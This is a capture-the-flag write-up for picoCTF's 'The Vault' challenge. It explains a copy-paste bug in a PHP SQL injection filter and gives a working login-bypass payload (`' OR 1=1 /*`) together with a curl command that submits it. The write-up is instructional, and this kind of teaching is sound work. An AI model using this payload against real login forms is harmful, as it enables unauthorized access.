# The Vault
There is a website running at [http://2018shell.picoctf.com:22430](http://2018shell.picoctf.com:22430). Try to see if you can login!


## Solution
The login source code is located at [http://2018shell.picoctf.com:22430/login.txt](http://2018shell.picoctf.com:22430/login.txt). In this file you'll notice that the writer is doing SQL injection checks:

```
//validation check
$pattern ="/.*['\"].*OR.*/i";
$user_match = preg_match($pattern, $username);
$password_match = preg_match($pattern, $username);
if($user_match + $password_match > 0)  {
	echo "<h1>SQLi detected.</h1>";
}
```

However notice the error in the 4th line. The developer copied and pasted the line above and forgot to change `$username` to `$password`. Thus, we could still perform a SQL injection through the password field using `' OR 1=1 /*`.

### Exploit
The exploit is `curl --silent -XPOST http://2018shell.picoctf.com:22430/login.php -F password="' OR 1=1 /*" | grep -o "picoCTF{.*}"`.
